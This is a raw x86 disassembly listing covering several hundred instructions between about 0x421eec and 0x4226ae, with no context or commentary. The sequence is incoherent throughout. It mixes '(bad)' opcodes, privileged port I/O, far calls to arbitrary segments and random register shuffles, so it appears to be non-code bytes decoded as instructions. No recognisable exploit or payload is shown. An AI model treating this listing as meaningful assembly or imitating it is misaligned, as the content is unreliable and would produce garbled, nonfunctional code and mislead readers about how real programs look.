  421eec:	jno    0x421e90
  421eee:	sub    eax,0xc63bfc1
  421ef3:	out    0x2c,al
  421ef5:	pop    es
  421ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef8:	lods   eax,DWORD PTR es:[esi]
  421efa:	dec    esi
  421efb:	sub    edx,DWORD PTR ds:[esi+ebx*4+0x3c6cad58]
  421f03:	cmp    eax,0x19e9a5b2
  421f08:	retf   0x8891
  421f0b:	imul   ecx,DWORD PTR [ebx-0x75],0x78
  421f0f:	adc    al,0xfe
  421f11:	das    
  421f12:	jno    0x421f92
  421f14:	add    ebp,DWORD PTR ds:0x963e732f
  421f1a:	pop    ecx
  421f1b:	shr    edi,1
  421f1d:	lods   al,BYTE PTR ds:[esi]
  421f1e:	add    ebp,DWORD PTR [ebx-0x74]
  421f21:	sub    eax,0xf668ce86
  421f26:	sbb    al,0x6b
  421f28:	mov    eax,0x23c2c29b
  421f2d:	jge    0x421f07
  421f2f:	xor    DWORD PTR [edi-0x466c9fe8],edx
  421f35:	mov    ah,0x6c
  421f37:	push   edx
  421f38:	cmc    
  421f39:	mov    edi,0x743c48ab
  421f3e:	int    0x65
  421f40:	xchg   ah,bl
  421f42:	push   edi
  421f43:	dec    ecx
  421f44:	imul   ecx,DWORD PTR [esp+edx*8+0x775eb219],0x89b8975c
  421f4f:	jp     0x421f87
  421f51:	sbb    esi,ebx
  421f53:	inc    eax
  421f54:	aam    0x63
  421f56:	or     al,0xf4
  421f58:	sub    DWORD PTR ds:0x40359522,eax
  421f5e:	mov    bl,0x3d
  421f60:	cmp    dl,cl
  421f62:	jle    0x421f00
  421f64:	cmp    ebp,edi
  421f66:	les    ebx,FWORD PTR [ebx]
  421f68:	mov    ch,ah
  421f6a:	or     ebx,DWORD PTR [ebp+0x10d6c528]
  421f70:	pop    edi
  421f71:	pop    ds
  421f72:	lods   eax,DWORD PTR ds:[esi]
  421f73:	lea    esi,[esi-0x5c]
  421f76:	pop    es
  421f77:	push   eax
  421f78:	cli    
  421f79:	mov    dl,0xfb
  421f7b:	jle    0x421fbb
  421f7d:	je     0x421f06
  421f7f:	cli    
  421f80:	jb     0x421f24
  421f82:	dec    eax
  421f83:	fbstp  TBYTE PTR [ecx+0xf31de71]
  421f89:	push   ds
  421f8a:	jle    0x421f24
  421f8c:	test   DWORD PTR [esi-0x733182bb],ebx
  421f92:	sub    DWORD PTR [edi],ebp
  421f94:	or     esp,esi
  421f96:	pop    eax
  421f97:	(bad)  
  421f99:	sahf   
  421f9a:	test   BYTE PTR [edx+ebp*1+0x6a],cl
  421f9e:	retf   
  421f9f:	repz in al,0x40
  421fa2:	cmp    al,0x7d
  421fa4:	(bad)  
  421fa5:	out    0x1b,eax
  421fa7:	scas   eax,DWORD PTR es:[edi]
  421fa8:	mov    ch,0xa
  421faa:	mov    ecx,0x20cbe5ba
  421faf:	cmp    esi,DWORD PTR [esi]
  421fb1:	xor    eax,0xe20a863b
  421fb6:	icebp  
  421fb7:	dec    esi
  421fb8:	xlat   BYTE PTR ds:[ebx]
  421fb9:	or     eax,0x4eea6519
  421fbe:	(bad)  
  421fbf:	jmp    0x65731e5a
  421fc4:	fucomip st,st(6)
  421fc6:	imul   ecx,DWORD PTR [esi],0xc6c7fe47
  421fcc:	or     DWORD PTR [esi-0x6cfa26ab],0x15de27f0
  421fd6:	pop    ecx
  421fd7:	jno    0x42201e
  421fd9:	add    ch,BYTE PTR [ebp+0x10534d80]
  421fdf:	(bad)  
  421fe0:	sar    BYTE PTR [edx],1
  421fe2:	stos   DWORD PTR es:[edi],eax
  421fe3:	jo     0x421ffb
  421fe5:	push   ds
  421fe6:	imul   edi,DWORD PTR cs:[esi+0x7e],0xffffffd6
  421feb:	push   es
  421fec:	mov    ebx,0x3b0549f5
  421ff1:	scas   eax,DWORD PTR es:[edi]
  421ff2:	xor    ebx,esi
  421ff4:	lods   al,BYTE PTR ds:[esi]
  421ff5:	gs (bad) 
  421ff7:	pop    esp
  421ff8:	repnz xchg ebx,eax
  421ffa:	test   DWORD PTR ds:0x22afd7e4,ebx
  422000:	fld    DWORD PTR [eax]
  422002:	popa   
  422003:	fs xchg ebp,eax
  422005:	dec    ebx
  422006:	rcl    DWORD PTR [edi+0x31],cl
  422009:	adc    al,0xc
  42200b:	jno    0x422004
  42200d:	call   0x2aaa:0x853e1d0a
  422014:	imul   eax,DWORD PTR [edi-0x16],0xa
  422018:	imul   eax,DWORD PTR [ebx+edi*1+0x1e2970c2],0xffffffcb
  422020:	sbb    ebx,ebx
  422022:	in     eax,0xb9
  422024:	rcl    DWORD PTR [ecx+0x6b],1
  422027:	cwde   
  422028:	call   0x80ca:0x34f19c96
  42202f:	aad    0x46
  422031:	into   
  422032:	mov    ebp,0x6bb20dae
  422037:	jb     0x42206f
  422039:	add    BYTE PTR [ecx-0x1d30c9bc],dh
  42203f:	adc    ebp,DWORD PTR [ebx]
  422041:	sbb    ebx,DWORD PTR [ecx+esi*4]
  422044:	jp     0x42209a
  422046:	ss and al,0x91
  422049:	cmp    ah,cl
  42204b:	pop    esi
  42204c:	outs   dx,DWORD PTR ds:[esi]
  42204d:	popf   
  42204e:	in     al,0x84
  422050:	icebp  
  422051:	xchg   DWORD PTR [eax-0x4a113ad6],ebx
  422057:	jp     0x4220a7
  422059:	mov    ecx,0xae1972a
  42205e:	jnp    0x421ffd
  422060:	rcl    DWORD PTR [edx-0x69df3f91],cl
  422066:	push   edx
  422067:	push   ebx
  422068:	inc    eax
  422069:	push   ecx
  42206a:	sbb    DWORD PTR [edx-0x22],0x77
  42206e:	xor    dl,BYTE PTR [esi-0x7f]
  422071:	mov    ecx,0xdc37385b
  422076:	mov    dl,0xed
  422078:	cmp    esi,DWORD PTR [edi-0x532d879c]
  42207e:	or     edi,eax
  422080:	mov    al,ds:0xb33699e4
  422085:	pop    ds
  422086:	enter  0xe8fb,0xb1
  42208a:	push   ds
  42208b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42208d:	jg     0x4220e9
  42208f:	mov    ch,0xb3
  422091:	xchg   esp,eax
  422092:	retf   
  422093:	out    dx,eax
  422094:	mov    WORD PTR [edx+0x70067a3a],cs
  42209a:	mov    ch,0x3a
  42209c:	mov    dl,0x8
  42209e:	popa   
  42209f:	shl    DWORD PTR [ebp+eiz*1+0xc42e815],0x7d
  4220a7:	add    dh,bh
  4220a9:	jno    0x422057
  4220ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220ac:	push   ebp
  4220ad:	dec    edx
  4220ae:	push   cs
  4220af:	into   
  4220b0:	(bad)  
  4220b1:	mov    bh,0xb8
  4220b3:	data16 gs repz fucomp st(1)
  4220b8:	mov    dh,0xb3
  4220ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220bb:	fld    TBYTE PTR [ecx-0x4]
  4220be:	pop    es
  4220bf:	mov    ds:0x962474ec,al
  4220c4:	xchg   edx,eax
  4220c5:	fist   DWORD PTR [edi+ebx*2]
  4220c8:	push   ecx
  4220c9:	jge    0x422132
  4220cb:	mov    ebp,0x69c6ae76
  4220d0:	cmp    ch,BYTE PTR [ecx]
  4220d2:	ins    DWORD PTR es:[edi],dx
  4220d3:	test   BYTE PTR [esi+ecx*4+0xd1fbe6],ah
  4220da:	add    BYTE PTR [eax],al
  4220dc:	shl    BYTE PTR [edx],cl
  4220de:	xchg   esi,eax
  4220df:	call   0x1e52:0x6adebef6
  4220e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220e7:	and    dl,BYTE PTR [ebp-0x37]
  4220ea:	push   ebx
  4220eb:	imul   ebp,ebx,0x8500019b
  4220f1:	add    al,BYTE PTR [eax]
  4220f3:	add    dl,dl
  4220f5:	add    al,0x5f
  4220f7:	jl     0x422116
  4220f9:	add    eax,DWORD PTR [edi]
  4220fb:	scas   al,BYTE PTR es:[edi]
  4220fc:	xor    DWORD PTR [esi+0x41e60ff5],esp
  422102:	imul   ecx,edx,0xffffff82
  422105:	punpcklwd mm3,DWORD PTR [edi+0x2f]
  422109:	out    0x74,al
  42210b:	xor    al,bl
  42210d:	mov    dl,0xc8
  42210f:	cmp    eax,0x6c642f16
  422114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422115:	cmp    al,0x3e
  422117:	retf   
  422118:	(bad)
  42211b:	(bad)  
  42211c:	rcr    eax,1
  42211e:	or     al,0x88
  422120:	sbb    edx,DWORD PTR [ecx]
  422122:	jne    0x4220bb
  422124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422125:	dec    eax
  422126:	inc    ebx
  422127:	packuswb mm7,QWORD PTR [ecx+0x1e]
  42212b:	inc    esi
  42212c:	mov    sp,0x4c8a
  422130:	ja     0x422167
  422132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422133:	bound  eax,QWORD PTR [ebx-0x50]
  422136:	jg     0x4220ba
  422138:	or     eax,0xebc0bea8
  42213d:	or     al,0x2d
  42213f:	inc    eax
  422140:	dec    ebx
  422141:	push   esp
  422142:	je     0x42214f
  422144:	sub    edi,DWORD PTR [ebp+0x7ccdb28e]
  42214a:	rol    DWORD PTR [ebp+0x6861b488],1
  422150:	in     eax,0xc9
  422152:	(bad)  
  422153:	and    al,0x5e
  422155:	std    
  422156:	icebp  
  422157:	and    esp,DWORD PTR [ebx+esi*2+0x45]
  42215b:	dec    edx
  42215c:	add    BYTE PTR [esi-0x56],0x58
  422160:	xchg   ebx,eax
  422161:	ins    DWORD PTR es:[edi],dx
  422162:	jbe    0x4220f3
  422164:	ss add eax,0x1be245cf
  42216a:	inc    ecx
  42216b:	in     al,0xcc
  42216d:	push   0x24c37d9e
  422172:	inc    ebx
  422173:	ror    BYTE PTR [ebx-0x2d],cl
  422176:	sbb    al,0xd4
  422178:	fnstenv [eax-0x54b4c4bb]
  42217e:	xor    eax,0x87767b99
  422183:	or     ah,bh
  422185:	pusha  
  422186:	(bad)
  422189:	push   edx
  42218a:	jb     0x42213d
  42218c:	cli    
  42218d:	out    dx,eax
  42218e:	xchg   BYTE PTR [edi],dh
  422190:	push   ds
  422191:	sti    
  422192:	clc    
  422193:	jp     0x4221a1
  422195:	dec    edx
  422196:	push   ebp
  422197:	es neg ebp
  42219a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42219b:	cmp    ch,dl
  42219d:	mov    dh,0x5b
  42219f:	scas   al,BYTE PTR es:[edi]
  4221a0:	js     0x4221d2
  4221a2:	je     0x422201
  4221a4:	sbb    al,0x8a
  4221a6:	ret    
  4221a7:	jecxz  0x422219
  4221a9:	and    cl,BYTE PTR [ecx+0x53e06ac8]
  4221af:	cwde   
  4221b0:	and    dl,BYTE PTR [edi+0x2d]
  4221b3:	jns    0x422206
  4221b5:	jge    0x42216e
  4221b7:	stc    
  4221b8:	out    0xcd,eax
  4221ba:	ret    
  4221bb:	jo     0x42216d
  4221bd:	adc    al,BYTE PTR [ecx]
  4221bf:	or     BYTE PTR gs:[ebx+0x54],bl
  4221c3:	jl     0x422233
  4221c5:	addr16 xor al,0x30
  4221c8:	loope  0x422190
  4221ca:	fadd   QWORD PTR [esi-0x67]
  4221cd:	lock push ss
  4221cf:	test   DWORD PTR [ecx-0x6ca03919],ebx
  4221d5:	ja     0x422176
  4221d7:	popf   
  4221d8:	shl    BYTE PTR [edx],0x98
  4221db:	dec    ebp
  4221dc:	mov    ds:0x7bbc9dec,eax
  4221e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e2:	and    eax,0x89ecb6c8
  4221e7:	push   esp
  4221e8:	clc    
  4221e9:	xlat   BYTE PTR ds:[ebx]
  4221ea:	add    BYTE PTR [edx],0x27
  4221ed:	sbb    BYTE PTR [ecx],dh
  4221ef:	jecxz  0x4221eb
  4221f1:	adc    al,BYTE PTR [eax+0x79]
  4221f4:	ss popa 
  4221f6:	shl    DWORD PTR [ebx+0x2c],0xf8
  4221fa:	or     eax,0xe1d370a6
  4221ff:	push   es
  422200:	mov    dl,BYTE PTR [ebp-0x3a0536e8]
  422206:	sbb    al,0x37
  422208:	loope  0x42223c
  42220a:	cmp    esp,esi
  42220c:	adc    bh,BYTE PTR [ecx+0x50]
  42220f:	test   al,0x6
  422211:	in     eax,0xbb
  422213:	cs jbe 0x42219f
  422216:	jae    0x4221e9
  422218:	stos   BYTE PTR es:[edi],al
  422219:	fisttp WORD PTR [esp+edi*1]
  42221c:	mov    ah,0xeb
  42221e:	sbb    al,0x76
  422220:	sub    DWORD PTR [ecx-0x49c25487],esi
  422226:	sbb    eax,0xe39353c2
  42222b:	lods   al,BYTE PTR ds:[esi]
  42222c:	(bad)  [esi+0x51]
  42222f:	(bad)  
  422230:	je     0x422282
  422232:	ret    0x85df
  422235:	dec    eax
  422236:	jmp    0xb134f347
  42223b:	xchg   esp,eax
  42223c:	ret    
  42223d:	mov    ?,WORD PTR [ebp-0x4665bcb8]
  422243:	dec    esp
  422244:	(bad)  
  422245:	dec    BYTE PTR [ebx-0xf]
  422248:	repnz fild QWORD PTR [esi+0x74]
  42224c:	add    esi,DWORD PTR [ebp-0x3b5f0572]
  422252:	add    eax,DWORD PTR [ecx]
  422254:	scas   al,BYTE PTR es:[edi]
  422255:	xor    eax,0xf4e3af7a
  42225a:	xchg   edi,eax
  42225b:	scas   eax,DWORD PTR es:[edi]
  42225c:	and    eax,0xe247af8
  422261:	sbb    al,0xc1
  422263:	pop    ebx
  422264:	jne    0x4221ee
  422266:	dec    ebx
  422267:	outs   dx,DWORD PTR ds:[esi]
  422268:	ds adc al,0xc9
  42226b:	ss jle 0x422255
  42226e:	fnsave [edi+0x47]
  422271:	jns    0x42222d
  422273:	ds fdiv st(1),st
  422276:	scas   eax,DWORD PTR es:[edi]
  422277:	lock cmc 
  422279:	inc    esi
  42227a:	inc    esi
  42227b:	loope  0x422223
  42227d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42227f:	mov    bl,0x7d
  422281:	hlt    
  422282:	sub    ebp,DWORD PTR [eax]
  422284:	or     bl,BYTE PTR [esi]
  422286:	popa   
  422287:	pop    ebp
  422288:	jmp    0x9002cfbb
  42228d:	inc    esp
  42228e:	and    eax,0x423cefde
  422293:	xchg   cl,bh
  422295:	sub    BYTE PTR [eax-0x39173f2a],al
  42229b:	fdivr  QWORD PTR [esi]
  42229d:	out    dx,al
  42229e:	sub    ecx,ebx
  4222a0:	xor    esp,esp
  4222a2:	mov    ds:0xf307e633,eax
  4222a7:	sub    ah,BYTE PTR [edi]
  4222a9:	lods   eax,DWORD PTR ds:[esi]
  4222aa:	pusha  
  4222ab:	pop    esp
  4222ac:	fdivr  QWORD PTR [eax+0x2e]
  4222af:	jnp    0x42226f
  4222b1:	out    0x80,al
  4222b3:	ds test ah,ch
  4222b6:	jecxz  0x422299
  4222b8:	dec    edi
  4222b9:	gs scas eax,DWORD PTR es:[edi]
  4222bb:	sub    DWORD PTR [eax],ebx
  4222bd:	outs   dx,DWORD PTR ds:[esi]
  4222be:	ret    0x8258
  4222c1:	(bad)  
  4222c2:	into   
  4222c3:	dec    eax
  4222c4:	mov    eax,0xfd68980c
  4222c9:	pop    es
  4222ca:	add    dl,cl
  4222cc:	jle    0x42227c
  4222ce:	lahf   
  4222cf:	pusha  
  4222d0:	in     al,0x85
  4222d2:	push   ss
  4222d3:	adc    DWORD PTR [ecx],ecx
  4222d5:	sbb    edx,DWORD PTR [esi-0x18]
  4222d8:	retf   0xaf03
  4222db:	add    esp,edi
  4222dd:	jo     0x42231d
  4222df:	mov    esp,0x9d9fbab0
  4222e4:	mov    al,0xdc
  4222e6:	in     eax,dx
  4222e7:	clc    
  4222e8:	jle    0x4222f8
  4222ea:	(bad)  
  4222eb:	mov    eax,ss
  4222ed:	pop    eax
  4222ee:	cli    
  4222ef:	mov    edx,DWORD PTR [eax]
  4222f1:	pop    edx
  4222f2:	retf   
  4222f3:	xlat   BYTE PTR ds:[ebx]
  4222f4:	and    bl,BYTE PTR [eax]
  4222f6:	push   eax
  4222f7:	xchg   BYTE PTR [edi+esi*1-0x1d],cl
  4222fb:	inc    edx
  4222fc:	inc    esp
  4222fd:	and    eax,0x713c4f70
  422302:	cmp    BYTE PTR [edx+0x260d9602],ah
  422308:	ret    0xacc8
  42230b:	pcmpgtw mm2,mm0
  42230e:	inc    eax
  42230f:	cmc    
  422310:	sti    
  422311:	sbb    al,0x6d
  422313:	fsubr  QWORD PTR [ecx]
  422315:	scas   al,BYTE PTR es:[edi]
  422316:	int    0xbe
  422318:	daa    
  422319:	int3   
  42231a:	pop    edx
  42231b:	or     BYTE PTR [edi],ah
  42231d:	dec    BYTE PTR [ebp-0x6e]
  422320:	shl    DWORD PTR [edx+0x1121c7c9],cl
  422326:	sti    
  422327:	mov    ecx,0x14084241
  42232c:	test   eax,0xfd77c673
  422331:	ret    
  422332:	mov    ebx,0x6f7b17dd
  422337:	clc    
  422338:	and    esp,ebp
  42233a:	into   
  42233b:	sahf   
  42233c:	(bad)  
  42233d:	jae    0x42239d
  42233f:	cmp    dh,BYTE PTR [esi+0x46]
  422342:	mov    al,0x95
  422344:	push   ds
  422345:	(bad)  
  422346:	mov    al,ds:0x2c7995dd
  42234b:	out    dx,eax
  42234c:	popa   
  42234d:	push   eax
  42234e:	call   0x5b74:0xc836e347
  422355:	jmp    0x4223c3
  422357:	aam    0x11
  422359:	sti    
  42235a:	stos   DWORD PTR es:[edi],eax
  42235b:	sti    
  42235c:	in     eax,dx
  42235d:	sahf   
  42235e:	jno    0x422320
  422360:	ret    
  422361:	cmp    edi,DWORD PTR [ebx+0x480007a1]
  422367:	icebp  
  422368:	lock xchg esp,eax
  42236a:	push   edx
  42236b:	sub    al,0xd4
  42236d:	pop    eax
  42236e:	ret    
  42236f:	and    dl,BYTE PTR [edx-0x4ab465c2]
  422375:	jnp    0x422373
  422377:	xor    al,0xfe
  422379:	add    BYTE PTR [eax],al
  42237b:	add    ch,bl
  42237d:	cmp    al,0x8f
  42237f:	mov    esp,0x7dffbfef
  422384:	add    al,BYTE PTR [ebp-0x2152723f]
  42238a:	adc    ebp,DWORD PTR [eax+esi*2-0x7afffe62]
  422391:	add    al,BYTE PTR [eax]
  422393:	add    BYTE PTR [ecx+0x27],bh
  422396:	cwde   
  422397:	js     0x4223d5
  422399:	mov    al,ds:0x31ea20dc
  42239e:	inc    ecx
  42239f:	pop    edi
  4223a0:	cwde   
  4223a1:	fcom   DWORD PTR [ebx+0x523b06c8]
  4223a7:	ins    DWORD PTR es:[edi],dx
  4223a8:	test   eax,0x86538dce
  4223ad:	loop   0x4223fe
  4223af:	loope  0x4223dc
  4223b1:	int3   
  4223b2:	inc    ecx
  4223b3:	daa    
  4223b4:	sub    al,0x62
  4223b6:	pop    eax
  4223b7:	pop    es
  4223b8:	pop    esp
  4223b9:	mov    bh,0x18
  4223bb:	adc    eax,0x31c082ad
  4223c0:	mov    ebp,0x7209a6d6
  4223c5:	(bad)  
  4223c6:	in     eax,dx
  4223c7:	dec    edx
  4223c8:	push   esp
  4223c9:	cmc    
  4223ca:	push   esp
  4223cb:	gs das 
  4223cd:	xchg   esi,eax
  4223ce:	out    dx,eax
  4223cf:	int    0x11
  4223d1:	fdiv   DWORD PTR [eax-0x93f3d79]
  4223d7:	int    0xc0
  4223d9:	mov    ch,0x9c
  4223db:	mov    al,ds:0x4bf64fa0
  4223e0:	into   
  4223e1:	or     al,0x8c
  4223e3:	repz mov gs,esi
  4223e6:	leave  
  4223e7:	in     eax,0xd3
  4223e9:	call   0xdd47:0x650a3c95
  4223f0:	dec    esp
  4223f1:	push   0x5d
  4223f3:	push   es
  4223f4:	lea    ebx,[edx+eiz*1-0x78]
  4223f8:	cmovl  ebx,DWORD PTR [esi-0x68]
  4223fc:	scas   al,BYTE PTR es:[edi]
  4223fd:	loope  0x42244d
  4223ff:	bound  ebx,QWORD PTR [eax-0x2d]
  422402:	clc    
  422403:	stc    
  422404:	sub    BYTE PTR [edi-0x6d11c2fd],bh
  42240a:	jecxz  0x42244e
  42240c:	pop    ds
  42240d:	cs mov bh,0xbd
  422410:	mov    al,ds:0xfbf59f71
  422415:	shr    BYTE PTR [ecx],1
  422417:	ss rol ecx,0x0
  42241b:	or     ecx,DWORD PTR [ecx+0x20]
  42241e:	cdq    
  42241f:	ror    DWORD PTR [ebp+0x13cee8de],cl
  422425:	jmp    0x508ad17b
  42242a:	jge    0x4223ba
  42242c:	jmp    0x5f87d0c2
  422431:	stos   DWORD PTR es:[edi],eax
  422432:	jp     0x422470
  422434:	sub    edx,DWORD PTR [ebx-0x44]
  422437:	dec    edi
  422438:	and    DWORD PTR [ebx-0x1f],eax
  42243b:	inc    esp
  42243c:	jle    0x42247c
  42243e:	push   es
  42243f:	lods   al,BYTE PTR ds:[esi]
  422440:	arpl   WORD PTR [esp+edi*1-0xf],dx
  422444:	lea    eax,[eax]
  422446:	adc    eax,0xe9caff10
  42244b:	inc    esp
  42244c:	ins    DWORD PTR es:[edi],dx
  42244d:	adc    eax,esp
  42244f:	fs sub eax,0x177b009d
  422455:	push   0x92711a09
  42245a:	xor    al,BYTE PTR [ebp+0x42f25822]
  422460:	mov    esp,0x63f8893d
  422465:	arpl   WORD PTR [eax],dx
  422467:	call   0xeb8a:0x3f65f3e0
  42246e:	in     eax,0x7b
  422470:	(bad)  
  422471:	mov    ecx,0xba5648cf
  422476:	jg     0x422436
  422478:	cli    
  422479:	jo     0x4224c4
  42247b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42247c:	addr16 mov ch,0x69
  42247f:	mov    edx,0x5cf277d7
  422484:	xor    BYTE PTR [ecx+0x28ece5c7],ch
  42248a:	jmp    0x42243a
  42248c:	and    eax,0xa234f2c8
  422491:	outs   dx,DWORD PTR ds:[esi]
  422492:	sahf   
  422493:	test   eax,0x86ff7905
  422498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422499:	out    dx,eax
  42249a:	arpl   WORD PTR [ecx+0x4],bp
  42249d:	inc    eax
  42249e:	add    al,0x67
  4224a0:	mov    ebx,0xae8044ea
  4224a5:	jmp    0xf654:0x695b30fe
  4224ac:	and    DWORD PTR [esi],eax
  4224ae:	xchg   ebx,eax
  4224af:	jge    0x422449
  4224b1:	inc    esi
  4224b2:	sub    BYTE PTR [esi],bh
  4224b4:	push   ebx
  4224b5:	adc    bh,ch
  4224b7:	push   ebx
  4224b8:	int    0x4d
  4224ba:	or     ch,BYTE PTR [ebp-0x43]
  4224bd:	and    dl,ah
  4224bf:	iret   
  4224c0:	int3   
  4224c1:	inc    ecx
  4224c2:	sub    bl,BYTE PTR [ecx-0x65]
  4224c5:	fsub   QWORD PTR [esi]
  4224c7:	sti    
  4224c8:	ja     0x42249e
  4224ca:	lock xchg esp,eax
  4224cc:	ss inc ecx
  4224ce:	mov    al,ds:0xfb8648b
  4224d3:	and    eax,0x9f4c6d6c
  4224d8:	adc    ecx,DWORD PTR [eax-0x15]
  4224db:	test   DWORD PTR [edx+0x7c],esp
  4224de:	mov    dh,0x41
  4224e0:	or     BYTE PTR [edx-0x3f076f1f],dl
  4224e6:	aaa    
  4224e7:	xlat   BYTE PTR ds:[ebx]
  4224e8:	jno    0x4224d3
  4224ea:	and    dl,BYTE PTR [edi]
  4224ec:	hlt    
  4224ed:	ret    
  4224ee:	xor    BYTE PTR [edi+eiz*4-0x698646ac],bl
  4224f5:	mov    ch,0x44
  4224f7:	push   edx
  4224f8:	or     al,0xbd
  4224fa:	leave  
  4224fb:	mov    bh,0xf1
  4224fd:	jmp    0xe3cc27e
  422502:	sub    al,0x4
  422504:	jae    0x422492
  422506:	sub    DWORD PTR [ebx+0x70a477a0],ebx
  42250c:	ins    DWORD PTR es:[edi],dx
  42250d:	or     eax,0x2ab08ed6
  422512:	cmp    esi,DWORD PTR [ebx-0x1573c269]
  422518:	jmp    0x4224ba
  42251a:	leave  
  42251b:	dec    ebx
  42251c:	adc    al,BYTE PTR [eax+esi*8-0x21]
  422520:	mov    ch,0x2c
  422522:	mov    ebp,0xa3e16f73
  422527:	jmp    FWORD PTR ds:0x3b18f5a8
  42252d:	fst    DWORD PTR [edi-0x4aa22b23]
  422533:	xchg   ebx,eax
  422534:	push   ebx
  422535:	es sub eax,0xe7be2dba
  42253b:	sbb    bh,BYTE PTR ds:0xb34154a6
  422541:	sbb    al,0x4e
  422543:	and    ah,ah
  422545:	mov    ds:0x38d8a933,al
  42254a:	mov    al,0xb4
  42254c:	inc    ecx
  42254d:	add    DWORD PTR [esi],0x2fe4ac90
  422553:	and    al,0x2d
  422555:	pusha  
  422556:	lea    esp,[edi+edi*1]
  422559:	or     al,0x4d
  42255b:	inc    edi
  42255c:	add    ch,cl
  42255e:	int3   
  42255f:	je     0x422502
  422561:	gs jecxz 0x422588
  422564:	cld    
  422565:	int    0x24
  422567:	std    
  422568:	jmp    0xbfb6:0x19a583fb
  42256f:	stos   BYTE PTR es:[edi],al
  422570:	(bad)  [edx+0x41]
  422573:	bound  esp,QWORD PTR [edi]
  422575:	cdq    
  422576:	jno    0x422552
  422578:	imul   esp,DWORD PTR [edi-0x7],0xffffffe7
  42257c:	sub    bh,al
  42257e:	sub    ecx,DWORD PTR [edi-0x2d948e89]
  422584:	fwait
  422585:	add    DWORD PTR [edx],ebp
  422587:	in     eax,0x46
  422589:	push   es
  42258a:	test   DWORD PTR [ecx+0x77],ebp
  42258d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42258e:	cwde   
  42258f:	mov    BYTE PTR [edi-0x54f0d80a],ch
  422595:	pushf  
  422596:	or     BYTE PTR [edx+edx*4-0xdd215bf],0x5b
  42259e:	xor    eax,0xd21585bb
  4225a3:	mov    ebx,0xfd3ffd96
  4225a8:	rol    DWORD PTR [ebx-0x55916831],1
  4225ae:	push   ss
  4225af:	stos   BYTE PTR es:[edi],al
  4225b0:	adc    eax,0xf9a63b0c
  4225b5:	dec    eax
  4225b6:	xor    BYTE PTR [ebx],ah
  4225b8:	dec    ebx
  4225b9:	cs push ss
  4225bb:	mov    ch,0x55
  4225bd:	test   eax,0x7194a36c
  4225c2:	test   al,0xeb
  4225c4:	sbb    eax,0x4a046218
  4225ca:	mov    eax,fs
  4225cc:	jb     0x4225aa
  4225ce:	pop    edx
  4225cf:	fisttp QWORD PTR [ebx-0x2ae31e98]
  4225d5:	and    eax,0x278452ed
  4225da:	test   al,0x34
  4225dc:	popf   
  4225dd:	ror    DWORD PTR [edx+0x8],1
  4225e0:	push   cs
  4225e1:	or     ebp,ebx
  4225e3:	je     0x4225b0
  4225e5:	dec    edx
  4225e6:	dec    eax
  4225e7:	in     eax,dx
  4225e8:	sbb    al,0x55
  4225ea:	pop    ebp
  4225eb:	or     DWORD PTR [eax-0x34cea467],ecx
  4225f1:	jbe    0x422602
  4225f3:	xor    DWORD PTR [ebx],0xffffffc8
  4225f6:	enter  0xc19,0xbf
  4225fa:	xor    eax,0x7dd22f55
  4225ff:	popf   
  422600:	ins    BYTE PTR es:[edi],dx
  422601:	(bad)  
  422602:	aad    0x6e
  422604:	or     BYTE PTR [edi-0x11e38a87],bh
  42260a:	mov    ebp,0x9797959c
  42260f:	xor    al,0x4e
  422611:	fidivr WORD PTR [edi+0x46]
  422614:	xor    eax,0xda65e819
  422619:	add    BYTE PTR [eax],al
  42261b:	add    BYTE PTR [esi-0x4fd6421],dh
  422621:	inc    esi
  422622:	mov    edi,0x5e25f0ff
  422627:	and    eax,0xe261b8bd
  42262c:	cmc    
  42262d:	mov    al,ds:0x2850001
  422632:	add    BYTE PTR [eax],al
  422634:	dec    ecx
  422635:	pop    ss
  422636:	mov    ecx,0x70b90ee0
  42263b:	fist   DWORD PTR [edx+0x14]
  42263e:	pop    ebp
  42263f:	mov    ebx,0xdeedf5b2
  422644:	adc    dl,0x62
  422647:	jg     0x4226bf
  422649:	or     BYTE PTR [edi],ah
  42264b:	scas   eax,DWORD PTR es:[edi]
  42264c:	shl    DWORD PTR [esi],0x24
  42264f:	pop    ds
  422650:	push   ds
  422651:	dec    ecx
  422652:	jnp    0x4225f2
  422654:	ret    
  422655:	shr    BYTE PTR [ebp+0x80a4545],0x79
  42265c:	js     0x422679
  42265e:	cmp    ah,al
  422660:	leave  
  422661:	push   ds
  422662:	mov    esp,0x5195017b
  422667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422668:	xchg   ebx,eax
  422669:	dec    edi
  42266a:	dec    esp
  42266b:	das    
  42266c:	div    eax
  42266e:	add    al,0x8b
  422670:	(bad)  
  422671:	out    dx,al
  422672:	pop    esi
  422673:	popa   
  422674:	retf   
  422675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422676:	mov    al,ds:0xbe75750c
  42267b:	sbb    al,0xf3
  42267d:	cmc    
  42267e:	fisub  WORD PTR [ebx-0x6980acf7]
  422684:	ins    DWORD PTR es:[edi],dx
  422685:	leave  
  422686:	in     eax,0x86
  422688:	xsha256 (bad)
  422689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42268a:	push   ss
  42268b:	jmp    0x8c0:0x72cd8b95
  422692:	or     cl,BYTE PTR [esi-0x36b281de]
  422698:	pop    ebx
  422699:	push   esp
  42269a:	cwde   
  42269b:	(bad)  
  42269c:	jnp    0x422662
  42269e:	pop    esp
  42269f:	xchg   esp,eax
  4226a0:	into   
  4226a1:	jmp    0x1d3a:0xe44d16a2
  4226a8:	fwait
  4226a9:	(bad)  
  4226aa:	retf   
  4226ab:	(bad)  
  4226ac:	jne    0x4226a4
  4226ae:	shl    BYTE PTR [ebp+0x3a732026],0x72
